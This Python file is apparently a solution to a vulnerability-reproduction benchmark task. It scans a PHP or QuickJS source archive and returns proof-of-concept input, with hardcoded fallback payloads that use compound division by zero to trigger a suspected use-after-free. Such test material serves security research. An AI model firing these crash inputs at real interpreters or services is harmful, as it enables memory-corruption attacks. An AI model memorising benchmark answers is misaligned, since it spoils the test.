import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class _Archive:
    def __init__(self, src_path: str):
        self.src_path = src_path
        self.is_dir = os.path.isdir(src_path)
        self._tar = None
        self._members = None

        if not self.is_dir:
            self._tar = tarfile.open(src_path, "r:*")
            self._members = self._tar.getmembers()

    def close(self) -> None:
        if self._tar is not None:
            try:
                self._tar.close()
            except Exception:
                pass

    def iter_names(self) -> Iterable[str]:
        if self.is_dir:
            for root, _, files in os.walk(self.src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    rel = os.path.relpath(p, self.src_path)
                    yield rel.replace(os.sep, "/")
        else:
            for m in self._members:
                if m.isfile():
                    yield m.name

    def iter_files(self, exts: Optional[Tuple[str, ...]] = None, max_size: int = 1_000_000) -> Iterable[Tuple[str, bytes]]:
        if self.is_dir:
            for root, _, files in os.walk(self.src_path):
                for fn in files:
                    if exts is not None and not fn.lower().endswith(exts):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if st.st_size > max_size:
                        continue
                    try:
                        with open(p, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    rel = os.path.relpath(p, self.src_path).replace(os.sep, "/")
                    yield rel, data
        else:
            for m in self._members:
                if not m.isfile():
                    continue
                name = m.name
                if exts is not None and not name.lower().endswith(exts):
                    continue
                if m.size > max_size:
                    continue
                try:
                    f = self._tar.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                yield name, data


def _extract_phpt_file_section(phpt_text: str) -> Optional[str]:
    m = re.search(r"(?ms)^\s*--FILE(?:EOF)?--\s*\n(.*?)(?=^--[A-Z0-9_]+--\s*$)", phpt_text)
    if m:
        return m.group(1)
    m2 = re.search(r"(?ms)^\s*--FILE(?:EOF)?--\s*\n(.*)\Z", phpt_text)
    if m2:
        return m2.group(1)
    return None


def _best_candidate(cands: List[bytes]) -> Optional[bytes]:
    def score(b: bytes) -> Tuple[int, int]:
        s = b.decode("latin1", "ignore")
        sc = 0
        if "/=" in s:
            sc += 20
        if re.search(r"/=\s*0", s):
            sc += 20
        if "division by zero" in s.lower() or "DivisionByZero" in s:
            sc += 10
        if "try" in s and "catch" in s:
            sc += 10
        if "Throwable" in s:
            sc += 5
        if "0n" in s:
            sc += 15
        return sc, -len(b)

    if not cands:
        return None
    return max(cands, key=score)


def _wrap_php(code: bytes) -> bytes:
    # Make it work both when the harness uses eval-string (starts in PHP mode)
    # and when it executes a file (starts in HTML mode): prefix "?>"
    # If code doesn't already start with an open tag, also add "<?php".
    prefix_scan = code[:256].lstrip(b"\xef\xbb\xbf \t\r\n")
    if prefix_scan.startswith(b"<?"):
        return b"?>" + code.strip()
    return b"?><?php" + code.strip()


def _fallback_php_poc() -> bytes:
    payload = b'$a=str_repeat("A",100);try{$a/=0;}catch(Throwable$e){}var_dump($a);'
    return _wrap_php(payload)


def _fallback_quickjs_poc() -> bytes:
    # BigInt division by zero throws; keep running and use 'a' after to trigger any UAF.
    return b"var a=1n;try{a/=0n}catch(e){}a+0n"


class Solution:
    def solve(self, src_path: str) -> bytes:
        arc = _Archive(src_path)
        try:
            names = list(arc.iter_names())
            low_names = [n.lower() for n in names]

            is_php = any(
                ("/zend/" in n) or n.endswith(".phpt") or n.endswith("/php.ini-development") or n.endswith("/php.ini-production")
                or n.endswith("/zend.h") or n.endswith("/zend_execute.c")
                for n in low_names
            )

            is_quickjs = any(
                n.endswith("/quickjs.c") or n.endswith("/quickjs.h") or n.endswith("/qjs.c") or n.endswith("/qjsc.c")
                or "quickjs" in n
                for n in low_names
            )

            if not (is_php or is_quickjs):
                # Lightweight content-based detection
                hits_php = 0
                hits_qjs = 0
                read_budget = 0
                for _, data in arc.iter_files(exts=(".c", ".cc", ".cpp", ".h"), max_size=400_000):
                    read_budget += len(data)
                    if b"zend_eval_string" in data or b"zend_compile" in data or b"ZEND_" in data:
                        hits_php += 1
                    if b"JS_Eval" in data or b"JSRuntime" in data or b"quickjs" in data:
                        hits_qjs += 1
                    if read_budget > 3_000_000 or hits_php >= 2 or hits_qjs >= 2:
                        break
                if hits_php > hits_qjs:
                    is_php = True
                elif hits_qjs > hits_php:
                    is_quickjs = True
                else:
                    is_php = True  # default per vulnerability description

            if is_php:
                cands: List[bytes] = []
                # Prefer .phpt file sections if any match compound division by zero
                for name, data in arc.iter_files(exts=(".phpt",), max_size=250_000):
                    try:
                        txt = data.decode("utf-8", "ignore")
                    except Exception:
                        txt = data.decode("latin1", "ignore")
                    if "/=" not in txt or "0" not in txt:
                        continue
                    file_sec = _extract_phpt_file_section(txt)
                    if not file_sec:
                        continue
                    file_bytes = file_sec.encode("utf-8", "ignore").strip()
                    if b"/=" not in file_bytes or b"0" not in file_bytes:
                        continue
                    cands.append(_wrap_php(file_bytes))

                # Also scan any small .php test files
                for name, data in arc.iter_files(exts=(".php",), max_size=200_000):
                    if b"/=" not in data or b"0" not in data:
                        continue
                    cands.append(_wrap_php(data))

                best = _best_candidate(cands)
                if best is not None and len(best) > 0:
                    return best
                return _fallback_php_poc()

            if is_quickjs:
                cands_js: List[bytes] = []
                for name, data in arc.iter_files(exts=(".js", ".mjs"), max_size=200_000):
                    if b"/=" not in data:
                        continue
                    if b"0n" not in data and b"/=0" not in data and b"/= 0" not in data:
                        continue
                    cands_js.append(data.strip())
                best_js = _best_candidate(cands_js)
                if best_js is not None and len(best_js) > 0:
                    return best_js
                return _fallback_quickjs_poc()

            return _fallback_php_poc()
        finally:
            arc.close()